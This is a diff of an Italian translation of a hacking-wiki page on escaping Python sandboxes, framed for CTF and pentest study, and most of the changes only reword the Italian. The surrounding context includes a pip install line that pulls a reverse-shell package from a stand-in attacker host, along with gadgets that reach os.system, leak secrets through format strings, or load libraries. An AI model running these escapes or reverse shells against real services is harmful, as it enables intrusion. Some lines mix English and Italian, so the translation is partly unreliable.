@@ -17,9 +17,9 @@ Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="
 
 <figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-#### Get a hacker's perspective on your web apps, network, and cloud
+**Ottieni la prospettiva di un hacker sulle tue app web, rete e cloud**
 
-**Trova e segnala vulnerabilità critiche ed esploitabili con un impatto reale sul business.** Usa i nostri oltre 20 strumenti personalizzati per mappare la superficie di attacco, trovare problemi di sicurezza che ti permettano di elevare i privilegi e utilizzare exploit automatizzati per raccogliere prove essenziali, trasformando il tuo duro lavoro in report persuasivi.
+**Trova e segnala vulnerabilità critiche ed esploitabili con un reale impatto sul business.** Usa i nostri oltre 20 strumenti personalizzati per mappare la superficie di attacco, trovare problemi di sicurezza che ti permettano di elevare i privilegi e utilizzare exploit automatizzati per raccogliere prove essenziali, trasformando il tuo duro lavoro in report persuasivi.
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
@@ -27,7 +27,7 @@ Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="
 
 Questi sono alcuni trucchi per bypassare le protezioni della sandbox di Python ed eseguire comandi arbitrari.
 
-## Command Execution Libraries
+## Librerie di Esecuzione Comandi
 
 La prima cosa che devi sapere è se puoi eseguire direttamente codice con qualche libreria già importata, o se potresti importare una di queste librerie:
 ```python
@@ -102,7 +102,7 @@ Se hai accesso a `pip` o `pip.main()`, puoi installare un pacchetto arbitrario e
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Puoi scaricare il pacchetto per creare la reverse shell qui. Si prega di notare che prima di utilizzarlo dovresti **decomprimerlo, modificare il `setup.py` e inserire il tuo IP per la reverse shell**:
+Puoi scaricare il pacchetto per creare la reverse shell qui. Si prega di notare che prima di utilizzarlo è necessario **decomprimerlo, modificare il `setup.py` e inserire il proprio IP per la reverse shell**:
 
 {% file src="../../../.gitbook/assets/Reverse.tar (1).gz" %}
 
@@ -110,7 +110,7 @@ Puoi scaricare il pacchetto per creare la reverse shell qui. Si prega di notare 
 Questo pacchetto si chiama `Reverse`. Tuttavia, è stato appositamente creato in modo che quando esci dalla reverse shell il resto dell'installazione fallisca, quindi **non lascerai alcun pacchetto python extra installato sul server** quando te ne vai.
 {% endhint %}
 
-## Eval-ing python code
+## Eval-ing codice python
 
 {% hint style="warning" %}
 Nota che exec consente stringhe multilinea e ";", ma eval non lo fa (controlla l'operatore walrus)
@@ -173,7 +173,7 @@ return x
 #+AAo-print(open("/flag.txt").read())
 """.lstrip()
 ```
-È anche possibile bypassarlo utilizzando altre codifiche, ad esempio `raw_unicode_escape` e `unicode_escape`.
+È anche possibile eluderlo utilizzando altre codifiche, ad esempio `raw_unicode_escape` e `unicode_escape`.
 
 ## Esecuzione di Python senza chiamate
 
@@ -469,7 +469,7 @@ Ad esempio, sapendo che con la libreria **`sys`** è possibile **importare libre
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
-Ci sono molte, e **ne abbiamo solo bisogno di una** per eseguire comandi:
+Ci sono molti, e **ne abbiamo solo bisogno di uno** per eseguire comandi:
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
@@ -712,7 +712,7 @@ Nota come puoi **accedere agli attributi** in modo normale con un **punto** come
 
 Nota anche che puoi usare `.__dict__` per enumerare gli elementi di un oggetto `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-Altre caratteristiche interessanti delle stringhe di formato è la possibilità di **eseguire** le **funzioni** **`str`**, **`repr`** e **`ascii`** nell'oggetto indicato aggiungendo **`!s`**, **`!r`**, **`!a`** rispettivamente:
+Alcune altre caratteristiche interessanti delle stringhe di formato è la possibilità di **eseguire** le **funzioni** **`str`**, **`repr`** e **`ascii`** nell'oggetto indicato aggiungendo **`!s`**, **`!r`**, **`!a`** rispettivamente:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
@@ -754,7 +754,7 @@ secret_variable = "clueless"
 x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
 str(x) # Out: clueless
 ```
-### Dalla formattazione al caricamento RCE delle librerie
+### Dalla formattazione al RCE caricamento di librerie
 
 Secondo il [**TypeMonkey chall di questo writeup**](https://corgi.rip/posts/buckeye-writeups/), è possibile caricare librerie arbitrarie dal disco abusando della vulnerabilità della stringa di formato in python.
 
@@ -791,12 +791,12 @@ Questo gadget consente di **caricare una libreria dal disco**. Pertanto, è nece
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
-La sfida sfrutta in realtà un'altra vulnerabilità nel server che consente di creare file arbitrari nel disco dei server.
+La sfida sfrutta in realtà un'altra vulnerabilità nel server che consente di creare file arbitrari nel disco del server.
 
 ## Dissezionare gli Oggetti Python
 
 {% hint style="info" %}
-Se vuoi **imparare** a conoscere **il bytecode di python** in profondità leggi questo **fantastico** post sull'argomento: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+Se vuoi **imparare** a conoscere **il bytecode di python** in profondità, leggi questo **fantastico** post sull'argomento: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
 In alcuni CTF potresti ricevere il nome di una **funzione personalizzata in cui risiede il flag** e devi esaminare gli **interni** della **funzione** per estrarlo.
@@ -947,7 +947,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ## Compilare Python
 
 Ora, immaginiamo che in qualche modo tu possa **estrarre le informazioni su una funzione che non puoi eseguire** ma che **devi** **eseguire**.\
-Come nel seguente esempio, tu **puoi accedere all'oggetto codice** di quella funzione, ma leggendo solo il disassemblaggio **non sai come calcolare il flag** (_immagina una funzione `calc_flag` più complessa_)
+Come nel seguente esempio, tu **puoi accedere all'oggetto codice** di quella funzione, ma leggendo semplicemente il disassemblaggio tu **non sai come calcolare il flag** (_immagina una funzione `calc_flag` più complessa_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -982,7 +982,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 {% hint style="info" %}
-A seconda della versione di python, i **parametri** di `code_type` potrebbero avere un **ordine diverso**. Il modo migliore per conoscere l'ordine dei parametri nella versione di python che stai eseguendo è eseguire:
+A seconda della versione di python, i **parametri** di `code_type` possono avere un **ordine diverso**. Il modo migliore per conoscere l'ordine dei parametri nella versione di python che stai eseguendo è eseguire:
 ```
 import types
 types.CodeType.__doc__
@@ -1007,10 +1007,10 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-Negli esempi precedenti all'inizio di questo post, puoi vedere **come eseguire qualsiasi codice python utilizzando la funzione `compile`**. Questo è interessante perché puoi **eseguire interi script** con cicli e tutto in un **one liner** (e potremmo fare lo stesso usando **`exec`**).\
+In previous examples at the beginning of this post, you can see **come eseguire qualsiasi codice python utilizzando la funzione `compile`**. This is interesting because you can **eseguire interi script** con cicli e tutto in un **un'unica riga** (e potremmo fare lo stesso usando **`exec`**).\
 Comunque, a volte potrebbe essere utile **creare** un **oggetto compilato** su una macchina locale ed eseguirlo nella **macchina CTF** (ad esempio perché non abbiamo la funzione `compiled` nel CTF).
 
-Per esempio, compiliamo ed eseguiamo manualmente una funzione che legge _./poc.py_:
+For example, let's compile and execute manually a function that reads _./poc.py_:
 ```python
 #Locally
 def read():
@@ -1059,7 +1059,7 @@ Utilizzando strumenti come [**https://www.decompiler.com/**](https://www.decompi
 
 ### Assert
 
-Python eseguito con ottimizzazioni con il parametro `-O` rimuoverà le dichiarazioni di assert e qualsiasi codice condizionale sul valore di **debug**.\
+Python eseguito con ottimizzazioni con il parametro `-O` rimuoverà le dichiarazioni di asserzione e qualsiasi codice condizionale sul valore di **debug**.\
 Pertanto, controlli come
 ```python
 def check_permission(super_user):
@@ -1069,7 +1069,7 @@ print("\nYou are a super user\n")
 except AssertionError:
 print(f"\nNot a Super User!!!\n")
 ```
-will be bypassed
+sarà eluso
 
 ## Riferimenti
 
@@ -1082,15 +1082,15 @@ will be bypassed
 
 <figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-#### Ottieni la prospettiva di un hacker sulle tue app web, rete e cloud
+**Ottieni la prospettiva di un hacker sulle tue app web, rete e cloud**
 
 **Trova e segnala vulnerabilità critiche ed esploitabili con un reale impatto sul business.** Usa i nostri oltre 20 strumenti personalizzati per mappare la superficie di attacco, trovare problemi di sicurezza che ti permettano di elevare i privilegi e utilizzare exploit automatizzati per raccogliere prove essenziali, trasformando il tuo duro lavoro in report persuasivi.
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
 {% hint style="success" %}
-Impara e pratica AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Impara e pratica GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Impara e pratica Hacking AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica Hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -1098,7 +1098,7 @@ Impara e pratica GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="
 
 * Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
 
 </details>
 {% endhint %}
